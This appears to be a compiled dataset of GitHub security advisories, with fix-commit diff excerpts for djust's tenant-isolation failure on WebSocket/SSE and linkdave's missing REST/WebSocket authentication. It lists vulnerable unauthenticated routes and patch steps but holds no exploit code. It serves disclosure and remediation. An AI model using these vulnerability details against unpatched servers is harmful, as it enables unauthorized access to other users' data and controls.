+    +        url: "https://example.com/voice/webhook",
+    +        method: "POST" as const,
+    +      },
+    +      pemPublicKey,
+    +    );
+    +    const second = verifyTelnyxWebhook(
+    +      {
+    +        headers: {
+    +          "telnyx-signature-ed25519": urlSafeSignature,
+    +          "telnyx-timestamp": timestamp,
+    +        },
+    +        rawBody,
+  FILE extensions/voice-call/src/webhook-security.ts
+
+=== GHSA-3492-cvg7-9mr2 sev=high pkgs=['pip:djust']
+src=https://github.com/djust-org/djust cwes=['CWE-636', 'CWE-862']
+SUMMARY: djust: Multi-tenant isolation fails open on the WebSocket/SSE path, disclosing other tenants' data
+DESC: ### Impact `djust.tenants` isolation was enforced only on the HTTP path. The current tenant was stored in `threading.local()` and set exclusively by the HTTP-only `TenantMiddleware`, so on the live (WebSocket/SSE) path `get_current_tenant()` was always `None` during mount and every event handler — and the tenant-aware `QuerySet` manager failed **OPEN** (returned the unfiltered queryset, ignoring `STRICT_MODE`), disclosing **every** tenant's rows to whoever held the socket. `threading.local` was additionally shared across connections on the `sync_to_async` executor thread. ### Patches Fixed in **djust 1.0.7**. Tenant storage moved to a `contextvars.ContextVar` (per async task); the resolved tenant is bound around WS/SSE mount and every dispatch; both managers scope the base queryset once and fail **CLOSED** (`.none()` under the default `STRICT_MODE`); and system check **S006** warns when `STRICT_MODE=False`. ### Workarounds No workaround on the live path short of upgrading.
+
+=== GHSA-xv8g-fj9h-6gmv sev=critical pkgs=['go:github.com/shi-gg/linkdave']
+src=https://github.com/shi-gg/linkdave cwes=['CWE-306']
+SUMMARY: Linkdave Missing Authentication on REST and WebSocket endpoints
+DESC: The `linkdave` server does not enforce authentication on its REST and WebSocket routes in versions prior to `0.1.5`. ### Impact An attacker with network access to the server port can: - Connect to the WebSocket endpoint (`/ws`) and receive a valid `session_id` in the `OpReady` response. - Use that session to invoke all REST player controls on any guild corresponding to their session id[1]. - Enumerate server statistics and runtime information via the unauthenticated `/stats` endpoint (still public after the fix). [1] If on [`>=0.1.0`](https://github.com/shi-gg/linkdave/releases/tag/v0.1.0), attackers are restricted to creating, controlling and deleting players created within their own session ID. ### Vulnerable Routes The following routes were entirely unauthenticated in `>= 0.0.1, < 0.1.5`: | Method | Path | Description | |--------|------|-------------| | `POST` | `/sessions/{session_id}/players/{guild_id}/play` | Start audio playback | | `POST` | `/sessions/{session_id}/players/{guild_id}/pause` | Pause playback | | `POST` | `/sessions/{session_id}/players/{guild_id}/resume` | Resume playback | | `POST` | `/sessions/{session_id}/players/{guild_id}/stop` | Stop playback | | `POST` | `/sessions/{session_id}/players/{guild_id}/seek` | Seek to position | | `PATCH` | `/sessions/{session_id}/players/{guild_id}/volume` | Set volume | | `DELETE` | `/sessions/{session_id}/players/{guild_id}` | Disconnect from voice channel | | `GET` | `/ws` | WebSocket event stream | ### Patches Update to [`0.1.5`](https://github.com/shi-gg/linkdave/commit/0f9a00d9d549b16278db81fce6dfec350c2abc01). ```diff - image: ghcr.io/shi-gg/linkdave:0.1.4 + image: ghcr.io/shi-gg/linkdave:latest ``` or ```sh docker pull ghcr.io/shi-gg/linkdave:latest ``` After upgrading, set the `LINKDAVE_PASSWORD` environment variable to a strong secret value. If this variable is left unset, the server will still accept all connections without authentication even on `>= 0.1.5`. **Server configuration (e.g. `compose.yml`):** ```sh environment: LINKDAVE_PASSWORD: ${LINKDAVE_PASSWORD} ``` ```sh echo "LINKDAVE_PASSWORD=$(openssl rand -hex 16)" >> .env ``` To restart the stack, run ```sh docker compose up -d ``` **TypeScript client (`0.1.5+`):** The client automatically handles authentication. Pass the password when constructing the client: ```ts const linkdave = new LinkDaveClient({ nodes: [ { name: "main", url: process.env.LINKDAVE_URI, password: process.env.LINKDAVE_PASSWORD } ] }); ``` ### Workarounds If upgrading is not immediately possible, restrict network access to the server's port using a firewall so it is only accessible from trusted internal IP addresses.
+FIX commit https://github.com/shi-gg/linkdave/commit/0f9a00d9d549b16278db81fce6dfec350c2abc01 status=200
+  MSG: feat: password authentication * feat: password authentication fixes GHSA-xv8g-fj9h-6gmv * refactor: use query param for ws auth * refactor: use bearer token auth
+  FILE README.md
+    -        container_name: radio-linkdave
+    +        container_name: linkdave
+    +            LINKDAVE_PASSWORD: ${LINKDAVE_PASSWORD}
+    +To generate a random password, you can use the following command in your terminal:
+    +```bash
+    +echo "LINKDAVE_PASSWORD=$(openssl rand -hex 16)" >> .env
+    +cat .env
+    +```
+  FILE client/package.json
+    -    "version": "0.1.4",
+    +    "version": "0.1.5",
+  FILE client/src/node.ts
+    +    password?: string;
+    -    readonly #options: Required<Omit<NodeOptions, "name" | "url">>;
+    +    readonly #options: Required<Omit<NodeOptions, "name" | "url" | "password">> & { password: string | undefined; };
+    -        this.rest = new RESTClient(options.url);
+    +        this.rest = new RESTClient(options.url, options.password);
+    -            maxReconnectAttempts: options.maxReconnectAttempts ?? 10
+    +            maxReconnectAttempts: options.maxReconnectAttempts ?? 10,
+    +            password: options.password
+    -            // Ensure we connect to the /ws endpoint
+    +            url.searchParams.set("node", this.name);
+    -            url.searchParams.set("node", this.name);
+    +            if (this.#options.password) {
+    +                url.searchParams.set("password", this.#options.password);
+    +            }
+  FILE client/src/rest.ts
+    +    readonly #password: string | undefined;
+    -    constructor(wsUrl: string) {
+    +    constructor(
+    +        wsUrl: string,
+    +        password?: string
+    +    ) {
+  FILE cmd/linkdave/main.go
+  FILE compose.yml
+  FILE example/index.ts
+  FILE server/server/routes.go
+  FILE server/server/websocket.go
